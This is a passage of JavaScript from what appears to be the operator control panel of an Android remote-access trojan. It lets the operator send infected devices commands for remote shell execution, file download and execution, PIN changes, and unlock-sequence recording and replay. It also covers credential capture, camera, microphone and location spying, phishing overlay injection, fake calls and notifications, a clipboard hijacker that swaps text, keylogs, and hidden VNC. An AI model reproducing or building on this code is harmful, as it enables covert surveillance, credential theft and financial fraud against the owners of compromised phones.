    if (!msg) return;
    cmd('SHOW_TOAST', { message: msg });
  }

  function sendDialog() {
    const title = $('dialog-title').value.trim();
    const msg   = $('dialog-msg').value.trim();
    cmd('SHOW_DIALOG', { title, message: msg });
  }

  function runShell() {
    const command = $('shell-cmd').value.trim();
    if (!command) return;
    cmd('SHELL', { command });
  }

  function openUrl() {
    const url = $('open-url').value.trim();
    if (!url) return;
    cmd('OPEN_URL', { url });
  }

  function downloadFile() {
    const url = $('dl-url').value.trim();
    if (!url) return;
    cmd('DOWNLOAD_FILE', { url });
    toast('Download command sent', 'accent');
  }

  function execFile() {
    const path = $('exec-path').value.trim();
    if (!path) return;
    cmd('EXECUTE_FILE', { path });
  }

  function setDevicePin() {
    const pin = $('set-pin').value.trim();
    if (!pin) return;
    cmd('SET_PIN', { pin });
  }

  // ─── Auto-Unlock system ───────────────────────────────────────────────────

  function showLockscreen() {
    const type = $('lockscreen-type').value || 'PIN';
    cmd('SHOW_LOCKSCREEN', { type });
  }

  function hideLockscreen() {
    cmd('HIDE_LOCKSCREEN');
  }

  function lockKeyPress(key) {
    cmd('LOCK_KEY_PRESS', { key: String(key) });
  }

  function startUnlockRecording() {
    cmd('START_UNLOCK_RECORDING');
    const btn = $('unlock-rec-stop');
    const startBtn = $('unlock-rec-start');
    if (btn) btn.disabled = false;
    if (startBtn) startBtn.disabled = true;
    pushActivity(selectedDeviceId, 'Unlock recording started');
  }

  function stopUnlockRecording() {
    cmd('STOP_UNLOCK_RECORDING');
    const btn = $('unlock-rec-stop');
    const startBtn = $('unlock-rec-start');
    if (btn) btn.disabled = true;
    if (startBtn) startBtn.disabled = false;
    pushActivity(selectedDeviceId, 'Unlock recording stopped — waiting for sequence…');
  }

  function playUnlockSequence() {
    const cache = deviceCache[selectedDeviceId] || {};
    const seq = $('unlock-seq-input')?.value?.trim() || cache.unlockSequence || '';
    if (seq) {
      cmd('PLAY_UNLOCK_SEQUENCE', { text: seq });
    } else {
      cmd('PLAY_UNLOCK_SEQUENCE');
    }
  }

  function patternUnlock() {
    const pattern = $('pattern-input').value.trim();
    if (!pattern) { toast('Enter a pattern sequence', 'danger'); return; }
    cmd('PATTERN_UNLOCK', { pattern });
  }

  function renderUnlockSequence(seqStr) {
    const el = $('unlock-seq-display');
    if (!el) return;
    el.textContent = seqStr;
    const input = $('unlock-seq-input');
    if (input && !input.value) input.value = seqStr;
  }

  function renderCredential(cred) {
    const container = $('credentials-list');
    if (!container) return;
    const row = document.createElement('div');
    row.className = 'cred-item';
    const conf = Math.round((cred.confidence || 0) * 100);
    const ts   = cred.ts ? new Date(cred.ts).toLocaleTimeString() : '';
    row.innerHTML = `
      <span class="cred-kind badge">${cred.kind || '?'}</span>
      <span class="cred-value">${cred.value || '—'}</span>
      <span class="cred-ctx">${cred.context || ''}</span>
      <span class="cred-conf">${conf}%</span>
      <span class="cred-ts">${ts}</span>
    `;
    if (container.firstChild) {
      container.insertBefore(row, container.firstChild);
    } else {
      container.appendChild(row);
    }
    const empty = container.querySelector('.empty-state');
    if (empty) empty.remove();
  }

  function clearCredentials() {
    const container = $('credentials-list');
    if (container) container.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
    if (selectedDeviceId && deviceCache[selectedDeviceId]) {
      deviceCache[selectedDeviceId].credentials = [];
    }
  }

  function promptVibrate() {
    const dur = parseInt(prompt('Vibration duration (ms):', '500'), 10);
    if (isNaN(dur)) return;
    cmd('VIBRATE', { duration: dur });
  }

  function promptTakePhoto() {
    const cam = prompt('Camera (front/back):', 'back');
    if (!cam) return;
    cmd('TAKE_PHOTO', { camera: cam });
  }

  function promptStartCamera() {
    const cam = prompt('Camera (front/back):', 'front');
    if (!cam) return;
    cmd('START_CAMERA', { camera: cam });
  }

  function promptStartMic() {
    const dur = parseInt(prompt('Recording duration (seconds, 0=continuous):', '30'), 10);
    cmd('START_MIC', { duration: isNaN(dur) ? 30 : dur });
  }

  function promptStartLocationTrack() {
    const interval = parseInt(prompt('Interval (seconds):', '60'), 10);
    cmd('START_LOCATION', { interval: isNaN(interval) ? 60 : interval });
  }

  // ─────────────────────────── Phishing ──────────────────────────
  function startPhishing() {
    const pkg = $('ph-package').value.trim();
    const url = $('ph-url').value.trim();
    cmd('SHOW_INJECT', { package: pkg, url });
  }

  function stopPhishing() {
    cmd('HIDE_INJECT');
  }

  function startBuiltinPhish(type) {
    cmd('SHOW_INJECT', { type });
  }

  // ─────────────────────────── Fake call ─────────────────────────
  function fakeCall() {
    const name   = $('fc-name').value.trim()   || 'Unknown';
    const number = $('fc-number').value.trim() || '+0000000000';
    cmd('FAKE_CALL', { name, number });
  }

  function fakeNotification() {
    const pkg     = $('fn-package').value.trim();
    const sender  = $('fn-sender').value.trim();
    const message = $('fn-message').value.trim();
    cmd('FAKE_NOTIFICATION', { package: pkg, sender, message });
  }

  // ─────────────────────────── Clipper ───────────────────────────
  function clipperToggle(active) {
    if (!selectedDeviceId) return;
    const cache = getCache(selectedDeviceId);
    cache.clipActive = active;
    cmd('CLIPPER_' + (active ? 'START' : 'STOP'), { rules: cache.clipRules });
    toast('Clipper ' + (active ? 'activated' : 'stopped'), active ? 'success' : 'warning');
  }

  function addClipperRule() {
    const match   = $('clip-match').value.trim();
    const replace = $('clip-replace').value.trim();
    if (!match || !replace) { toast('Fill in match and replace fields', 'warning'); return; }
    const cache = getCache(selectedDeviceId);
    cache.clipRules.push({ match, replace });
    renderClipperRules();
    $('clip-match').value   = '';
    $('clip-replace').value = '';
    if (cache.clipActive) {
      cmd('CLIPPER_UPDATE', { rules: cache.clipRules });
    }
  }

  function renderClipperRules() {
    const cache = getCache(selectedDeviceId);
    const el = $('clipper-rules');
    if (!cache.clipRules.length) {
      el.innerHTML = '<div class="empty-state">No rules</div>';
      return;
    }
    el.innerHTML = cache.clipRules.map((r, i) =>
      `<div class="clipper-rule">
        <span class="clip-match">${escHtml(r.match)}</span>
        <span style="color:var(--text-muted);">→</span>
        <span class="clip-replace">${escHtml(r.replace)}</span>
        <button class="btn btn-danger btn-sm" onclick="App.removeClipRule(${i})">✕</button>
      </div>`
    ).join('');
  }

  function removeClipRule(idx) {
    const cache = getCache(selectedDeviceId);
    cache.clipRules.splice(idx, 1);
    renderClipperRules();
  }

  function setClipboard() {
    const text = prompt('Set clipboard text:');
    if (text === null) return;
    cmd('SET_CLIPBOARD', { text });
  }

  function pushClipboardLog(data) {
    const logEl = $('clipboard-log');
    const entry = document.createElement('div');
    entry.className = 'clip-log-entry';
    entry.innerHTML = `<span class="clip-time">${new Date().toLocaleTimeString()}</span> ${escHtml(JSON.stringify(data))}`;
    if (logEl.querySelector('.empty-state')) logEl.innerHTML = '';
    logEl.insertBefore(entry, logEl.firstChild);
    if (logEl.children.length > 100) logEl.lastChild.remove();
  }

  // ─────────────────────────── Identity ──────────────────────────
  function setIdentity(name) {
    cmd('CHANGE_IDENTITY', { identity: name });
    $('identity-current').textContent = name;
    $all('.identity-btn').forEach(btn => {
      btn.classList.toggle('selected', btn.dataset.identity === name);
    });
    toast(`Identity set: ${name}`, 'accent');
  }

  // ─────────────────────────── Activity log ───────────────────────
  function pushActivity(deviceId, message) {
    if (!deviceId) return;
    const cache = getCache(deviceId);
    cache.logs = cache.logs || [];
    cache.logs.unshift({ time: Date.now(), message });
    if (cache.logs.length > 500) cache.logs.pop();

    if (selectedDeviceId === deviceId) {
      prependActivityLog('', message);
    }
  }

  function prependActivityLog(type, data) {
    const logEl = $('activity-log');
    if (!logEl) return;
    const entry = document.createElement('div');
    entry.className = 'activity-entry';
    const text = type ? `[${type}] ${truncate(JSON.stringify(data), 120)}` : String(data);
    entry.innerHTML = `<span class="act-time">${new Date().toLocaleTimeString()}</span> ${escHtml(text)}`;
    logEl.insertBefore(entry, logEl.firstChild);
    while (logEl.children.length > 100) logEl.lastChild.remove();
  }

  // ─────────────────────────── Toast ──────────────────────────────
  function toast(message, type = 'info') {
    const wrap = $('toast-wrap');
    const el   = document.createElement('div');
    el.className = `toast toast-${type}`;
    el.textContent = message;
    wrap.appendChild(el);
    // Animate in
    requestAnimationFrame(() => el.classList.add('visible'));
    setTimeout(() => {
      el.classList.remove('visible');
      setTimeout(() => el.remove(), 400);
    }, 3500);
  }

  // ─────────────────────────── Connection indicator ───────────────
  function setConnState(state) {
    const label = $('conn-label');
    const indicator = $('conn-indicator');
    const dot = indicator.querySelector('.dot');

    switch (state) {
      case 'connected':
        label.textContent = 'CONNECTED';
        dot.style.background = 'var(--success)';
        indicator.style.color = 'var(--success)';
        break;
      case 'connecting':
        label.textContent = 'CONNECTING…';
        dot.style.background = 'var(--warning)';
        indicator.style.color = 'var(--warning)';
        break;
      case 'disconnected':
      case 'error':
        label.textContent = state === 'error' ? 'ERROR' : 'DISCONNECTED';
        dot.style.background = 'var(--danger)';
        indicator.style.color = 'var(--danger)';
        break;
    }
  }

  // ─────────────────────────── Utilities ──────────────────────────
  function escHtml(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  function escAttr(str) {
    return String(str).replace(/'/g, '&#39;').replace(/"/g, '&quot;');
  }

  function truncate(str, max) {
    return str.length > max ? str.slice(0, max) + '…' : str;
  }

  function formatBytes(bytes) {
    if (bytes == null) return '';
    if (bytes < 1024)     return bytes + 'B';
    if (bytes < 1048576)  return (bytes / 1024).toFixed(1) + 'K';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + 'M';
    return (bytes / 1073741824).toFixed(2) + 'G';
  }

  function tryParse(val, fallback) {
    if (typeof val === 'object' && val !== null) return val;
    try { return JSON.parse(val) || fallback; } catch (_) { return fallback; }
  }

  // ─────────────────────────── REST helpers ───────────────────────
  async function fetchApi(path) {
    const res = await fetch(path);
    if (!res.ok) throw new Error(res.statusText);
    return res.json();
  }

  // ─────────────────────────── Init ───────────────────────────────
  function init() {
    // Tab bar
    $all('.tab-btn').forEach(btn => {
      btn.addEventListener('click', () => activateTab(btn.dataset.tab));
    });

    // VNC/HVNC keyboard input
    $('vnc-type-input').addEventListener('keydown', e => {
      if (e.key === 'Enter') { e.preventDefault(); vncSendText(); }
    });
    $('hvnc-type-input').addEventListener('keydown', e => {
      if (e.key === 'Enter') { e.preventDefault(); hvncSendText(); }
    });

    // Canvas interaction
    setupVncCanvas();
    setupHvncCanvas();

    // Connect
    connect();

    // Periodic stats refresh
    setInterval(() => {
      if (wsReady) send({ type: 'GET_BOTS' });
    }, 30000);
  }

  // ─────────────────────────── Public API ─────────────────────────
  return {
    // WS
    connect,
    // Device
    selectDevice,
    // Tabs
    activateTab,
    // VNC
    startVnc, stopVnc, vncQualityChange, vncSendText,
    // HVNC
    startHvnc, stopHvnc, hvncSendText, hvncCmd,
    // Files
    fileBrowse, fileNavUp, fileRefresh, downloadFromDevice,
    // SMS
    smsSearch,
    // Contacts
    contactsSearch,
    // Keylogs
    keylogRefresh, keylogClear, keylogCopy,
    // Apps
    appsSearch, uninstallAppPkg,
    // Commands
    cmd,
    // Controls
    sendSms, makeCall, openApp, uninstallApp, forceStop, clearAppData,
    blockPackage, unblockPackage, sendNotification, sendToast, sendDialog,
    runShell, openUrl, downloadFile, execFile, setDevicePin,
    promptVibrate, promptTakePhoto, promptStartCamera, promptStartMic,
    promptStartLocationTrack,
    // Auto-Unlock
    showLockscreen, hideLockscreen, lockKeyPress,
    startUnlockRecording, stopUnlockRecording, playUnlockSequence,
    patternUnlock, clearCredentials,
    // Phishing
    startPhishing, stopPhishing, startBuiltinPhish,
    // Fake call
    fakeCall, fakeNotification,
    // Clipper
    clipperToggle, addClipperRule, removeClipRule, setClipboard,
    // Identity
    setIdentity,
    // Toast
    toast,
    // Init
    init,
  };
})();

document.addEventListener('DOMContentLoaded', App.init);
